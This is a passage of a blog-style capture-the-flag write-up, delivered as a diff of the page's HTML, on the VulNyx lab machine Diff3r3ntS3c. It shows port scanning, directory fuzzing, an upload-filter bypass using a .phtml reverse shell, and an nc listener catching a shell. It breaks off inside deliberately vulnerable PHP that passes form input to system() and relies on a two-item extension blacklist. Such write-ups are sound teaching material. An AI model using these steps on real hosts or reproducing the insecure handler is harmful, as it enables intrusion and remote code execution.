@@ -1,0 +1,1183 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>VulNyx: Diff3r3ntS3c - hackcommander.github.io</title>
+<meta name="description" content="Writeup of the machine Diff3r3ntS3c from VulNyx.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.github.io">
+<meta property="og:title" content="VulNyx: Diff3r3ntS3c">
+<meta property="og:url" content="https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c/">
+
+
+  <meta property="og:description" content="Writeup of the machine Diff3r3ntS3c from VulNyx.">
+
+
+
+  <meta property="og:image" content="https://hackcommander.github.io/assets/images/2024-04-08-vulnyx-diff3r3nts3c/box-info.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2024-04-08T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://hackcommander.github.io/posts/2024/04/08/vulnyx-diff3r3nts3c/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Iván Santos Malpica",
+      "url": "https://hackcommander.github.io",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.github.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+    
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/search/">Search</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/advertising/">Advertising</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="https://hackcommander.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#posts" itemprop="item"><span itemprop="name">Posts</span></a>
+          <meta itemprop="position" content="2">
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#2024" itemprop="item"><span itemprop="name">2024</span></a>
+          <meta itemprop="position" content="3">
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#04" itemprop="item"><span itemprop="name">04</span></a>
+          <meta itemprop="position" content="4">
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#08" itemprop="item"><span itemprop="name">08</span></a>
+          <meta itemprop="position" content="5">
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">VulNyx: Diff3r3ntS3c</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Iván Santos Malpica<br>(Aka. HackCommander)</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Mathematician and Computer Engineer / Pentester / Bug Bounty Hunter / CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+      
+      
+        <li>
+          <a href="mailto:ivansantosmalpica.contact@gmail.com">
+            <meta itemprop="email" content="ivansantosmalpica.contact@gmail.com">
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://www.linkedin.com/in/ivan-santos-malpica" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://hackerone.com/hackcommander" target="_blank">
+            <img src="/assets/images/author-logos/hackerone.svg" alt="HackerOne" style="width: 16px; height: 16px;">
+            HackerOne
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://app.yogosha.com/r/hackcommander" target="_blank">
+            <img src="/assets/images/author-logos/yogosha.svg" alt="Yogosha" style="width: 16px; height: 16px;">
+            Yogosha
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://twitter.com/H4ckC0mm4nd3r" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+      
+      
+        
+          <li>
+            <a href="https://www.youtube.com/@ivansantosmalpica" itemprop="sameAs" rel="nofollow noopener noreferrer">
+              <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> YouTube
+            </a>
+          </li>
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+      
+      
+        <li>
+          <a href="https://tryhackme.com/p/HackCommander" target="_blank">
+            <img src="/assets/images/author-logos/tryhackme.svg" alt="TryHackMe" style="width: 15px; height: 15px;">
+            TryHackMe
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://app.hackthebox.com/profile/270539" target="_blank">
+            <img src="/assets/images/author-logos/hackthebox.svg" alt="HackTheBox" style="width: 15px; height: 15px;">
+            HackTheBox
+          </a>
+        </li>
+      
+      
+      
+        <li>
+          <a href="https://www.codewars.com/users/HackCommander" target="_blank">
+            <img src="/assets/images/author-logos/codewars.svg" alt="CodeWars" style="width: 15px; height: 15px;">
+            CodeWars
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://www.buymeacoffee.com/ivansantos" target="_blank">
+            <img src="/assets/images/author-logos/buymeacoffee.svg" alt="Buy Me a Coffee" style="width: 16px; height: 16px;">
+            Buy Me a Coffee
+          </a>
+        </li>
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="VulNyx: Diff3r3ntS3c">
+    <meta itemprop="description" content="Writeup of the machine Diff3r3ntS3c from VulNyx.">
+    <meta itemprop="datePublished" content="April 08, 2024">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">VulNyx: Diff3r3ntS3c
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-04-08T00:00:00+02:00">April 08, 2024 </time> 
+          
+          
+        </p>
+        <h2 id="summary">Summary</h2>
+
+<ul>
+  <li><a href="#section-id-1">1. Port and service scanning</a></li>
+  <li>
+<a href="#section-id-2">2. Gaining access</a>
+    <ul>
+      <li><a href="#section-id-2-1">2.1. Detecting the arbitrary file upload</a></li>
+      <li><a href="#section-id-2-2">2.2. Getting a shell as candidate</a></li>
+      <li><a href="#section-id-2-3">2.3. Why does this arbitrary file upload exist?</a></li>
+    </ul>
+  </li>
+  <li>
+<a href="#section-id-3">3. Privilege escalation</a>
+    <ul>
+      <li><a href="#section-id-3-1">3.1. Detecting the cronjob vulnerability</a></li>
+      <li><a href="#section-id-3-2">3.2. Getting a shell as root</a></li>
+      <li><a href="#section-id-3-3">3.3. Why does this privilege escalation via cronjob exist?</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p style="text-align:center;"><img src="/assets/images/2024-03-31-vulnyx-hackingstation/box-info.png" style="width: 750px;"></p>
+
+<p>In this post we are going to see the writeup of the machine Diff3r3ntS3c from <a href="https://vulnyx.com/">VulNyx</a>. It’s an easy machine created by <a href="https://hackcommander.github.io/">HackCommander</a> (yeah, it’s me again <img class="emoji" title=":blush:" alt=":blush:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f60a.png" height="20" width="20">) especially designed for beginners. We are going to get access to the machine through an arbitrary file upload in a web form and then to escalate privileges through a cronjob executed as root using a script editable by any user.</p>
+
+<div id="section-id-1"></div>
+
+<h2 id="1-port-and-service-scanning">1. Port and service scanning</h2>
+
+<p>After running a port scan</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(hackcommander㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">--min-rate</span> 10000 10.0.2.20
+<span class="go">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-07 14:33 CEST
+Nmap scan report for 10.0.2.20
+Host is up (0.00010s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
+</span></code></pre></div></div>
+
+<p>we can see that the port 80 is open and therefore there is a web. Now running a service scan</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(hackcommander㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-p</span> 80 <span class="nt">-sCV</span> 10.0.2.20
+<span class="go">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-07 14:34 CEST
+Nmap scan report for 10.0.2.20
+Host is up (0.00038s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: Diff3r3ntS3c
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
+</span></code></pre></div></div>
+
+<p>we can see that there is a webserver <em>Apache httpd 2.4.57</em> running on Debian, but before looking for CVEs it is better to take a look at the web.</p>
+
+<div id="section-id-2"></div>
+
+<h2 id="2-gaining-access">2. Gaining access</h2>
+
+<div id="section-id-2-1"></div>
+
+<h2 id="21-detecting-the-arbitrary-file-upload">2.1. Detecting the arbitrary file upload</h2>
+
+<p>Accessing the website, it looks like the website of a cybersecurity company</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/web-index.png" alt=""></p>
+
+<p>and if we scroll down we can see that there is an upload form for candidates who want to work in the company</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/upload-form.png" alt=""></p>
+
+<p>If we try to upload a photo</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/upload-form-picture.png" alt=""></p>
+
+<p>we get the following message</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/png-ok-response.png" alt=""></p>
+
+<p>It seems that it is not performing any file renaming or any modification on the uploaded file, which is a good sign for us as hackers. Now we should find the directory where the file was uploaded, for which we could use the ffuf tool as follows</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(hackcommander㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span>ffuf <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/wordlists/OneListForAll/onelistforallmicro.txt <span class="nt">-u</span> http://10.0.2.20/FUZZ 
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.20/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/OneListForAll/onelistforallmicro.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+.ht_wsr.txt             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htpasswd-old           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.httpd.conf             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccessbak            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+index.phps              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.inc           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+?wsdl                   [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 1ms]
+.htpasswds              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess-dev           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htpasswd.bak           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+server-status?full      [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htm.bak                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+?view=log               [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
+.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.old           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htgroup                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.bak           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.swp           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+assets                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.txt           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htm.old                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+yesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylngrequesturlbutwearedoingitonpurposewearescann [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+index.html              [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
+.htpasswd_test          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htf                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.httr-oauth             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 235ms]
+.htaccess_extra         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess_sc            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.save          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 247ms]
+.htaccess.sample        [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.orig          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess_orig          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1ms]
+.htusers                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htm                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess.bak1          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+server-status?full&amp;showmodulestate [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess-marco         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htpasswd.inc           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccessold2           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+                        [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
+.htpasswrd              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.html.bak               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccessold            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+wp-config.phps          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+images                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess-local         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.html.old               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+.htaccess~              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
+index.html?findcli=-1   [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
+uploads                 [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 0ms]
+:: Progress: [26468/26468] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:05] :: Errors: 1 ::
+</span></code></pre></div></div>
+
+<p>As we can see, there is an <em>uploads</em> directory. If we visit it we can see that this directory is vulnerable to <em>directory listing</em> as we can see listed all the directories and files in the path</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-uploads.png" alt=""></p>
+
+<p>If we access directory <em>1</em></p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-1.png" alt=""></p>
+
+<p>we can see that there are 2 files, a <em>txt</em> file with the user’s data</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-txt.png" alt=""></p>
+
+<p>and the png file that has been uploaded without any renaming or change in the content</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-png.png" alt=""></p>
+
+<p>This may mean that the developer was not too careful in coding the file upload, since it is convenient to rename the uploaded files to avoid duplicate filenames and for security. However, sending the file upload request with burpsuite but changing the file extension to <em>php</em> we receive the following message</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/php-not-ok-response.png" alt=""></p>
+
+<p>So the backend is checking if the file extension is malicious or not. <strong>The question is whether it is using a whitelist or a blacklist of extensions</strong> to perform this check, and depending on that there could be an <a href="https://portswigger.net/web-security/file-upload">arbitrary file upload</a>.</p>
+
+<p>If we go to <a href="https://book.hacktricks.xyz/pentesting-web/file-upload">HackTricks</a> we can see that there are some simple file upload methods that we can check manually before running more complex attacks</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/hacktricks.png" alt=""></p>
+
+<p>We could copy all the extensions and send the burpsuite request to the intruder to check if there are any valid extensions. However, if it is using a blacklist of extensions it is quite likely that any of those extensions are valid, so using a random extension such as <em>phtml</em>, it throws the following message</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/phtml-ok-response.png" alt=""></p>
+
+<p>This means that <strong>we bypassed the file extension check by uploading a file with an extension that also allows the execution of PHP code</strong>.</p>
+
+<div id="section-id-2-2"></div>
+
+<h2 id="22-getting-a-shell-as-candidate">2.2. Getting a shell as candidate</h2>
+
+<p>To verify if the backend performs any checks on the file content and if we can execute code, let’s try to upload the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentestmonkey webshell</a> with <em>phtml</em> extension.</p>
+
+<p>After downloading the webshell, changing the extension to <em>phtml</em> and changing the IP to that of my attacking machine as follows</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/webshell-conf.png" alt=""></p>
+
+<p>it only remains to upload the webshell to the server. It is not necessary to use the burp for this task, and we can do it manually, receiving the following message</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/webshell-ok-response.png" alt=""></p>
+
+<p>Now we go to the last directory in the uploads directory and see that the shell was uploaded successfully</p>
+
+<p><img src="/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-webshell.png" alt=""></p>
+
+<p>After this, setting up a listener on the attacking machine on port 1234</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nc -nlvp 1234
+</span></code></pre></div></div>
+
+<p>and by clicking on the webshell, we receive the shell, and we can execute the following code</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(hackcommander㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-nlvp</span> 1234
+<span class="go">listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.20] 49956
+</span><span class="gp">Linux Diff3r3ntS3c 6.1.0-18-amd64 #</span>1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 <span class="o">(</span>2024-02-01<span class="o">)</span> x86_64 GNU/Linux
+<span class="go"> 16:45:30 up  2:22,  0 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1000(candidate) gid=1000(candidate) groups=1000(candidate)
+</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="gp">$</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">candidate
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/candidate
+<span class="gp">$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">user.txt
+</span><span class="gp">$</span><span class="w">
+</span></code></pre></div></div>
+
+<p>where we can see that we got a shell as the <em>candidate</em> user and that the user flag is in <em>/home/candidate/user.txt</em>.</p>
+
+<div id="section-id-2-3"></div>
+
+<h2 id="23-why-does-this-arbitrary-file-upload-exist">2.3. Why does this arbitrary file upload exist?</h2>
+
+<p>After opening the script that performs the data upload, we can see the following PHP code</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy
+  </button>
+</div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+    <span class="c1">// Get the name and the phone number of the user</span>
+    <span class="nv">$name</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+    <span class="nv">$phone_number</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'phone_number'</span><span class="p">];</span>
+
+    <span class="c1">// Get the file name and file temporal name</span>
+    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
+    <span class="nv">$file_tmp_name</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">];</span>
+
+    <span class="c1">// Create the data upload directory</span>
+    <span class="nv">$upload_directory</span><span class="o">=</span><span class="s1">'./uploads/'</span><span class="p">;</span>
+    <span class="nv">$new_directory</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$upload_directory</span> <span class="mf">.</span> <span class="s1">'/*'</span><span class="p">,</span> <span class="no">GLOB_ONLYDIR</span><span class="p">))</span> <span class="o">+</span> <span class="mi">1</span> <span class="mf">.</span> <span class="s2">"/"</span><span class="p">;</span>
+    <span class="nv">$data_upload_directory</span><span class="o">=</span><span class="nv">$upload_directory</span> <span class="mf">.</span> <span class="nv">$new_directory</span><span class="p">;</span>
+    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$data_upload_directory</span><span class="p">);</span>
+
+    <span class="c1">// Store the name and the phone number of the user in a txt file</span>
+    <span class="nv">$user_data</span><span class="o">=</span><span class="s2">"Name: </span><span class="nv">$name</span><span class="se">\n</span><span class="s2">Phone number: </span><span class="nv">$phone_number</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nv">$save_user_data_command</span><span class="o">=</span><span class="s2">"echo '</span><span class="nv">$user_data</span><span class="s2">' &gt; </span><span class="nv">$data_upload_directory</span><span class="s2">/userinfo.txt"</span><span class="p">;</span>
+    <span class="nb">system</span><span class="p">(</span><span class="nv">$save_user_data_command</span><span class="p">);</span>
+
+    <span class="c1">// Set the not allowed file extensions</span>
+    <span class="nv">$not_allowed_file_extensions</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'php'</span><span class="p">];</span> <span class="c1">// These will be the only file extensions allowed</span>
+
+    <span class="c1">// Get the file extension</span>
+    <span class="nv">$file_extension</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">end</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$file_name</span><span class="p">)));</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">]))</span> <span class="p">{</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$file_extension</span><span class="p">,</span><span class="nv">$not_allowed_file_extensions</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// If the file extension is not allowed</span>
+
+            <span class="k">echo</span> <span class="s2">"This file looks malicious. Please do not try to hack us."</span><span class="p">;</span>
+
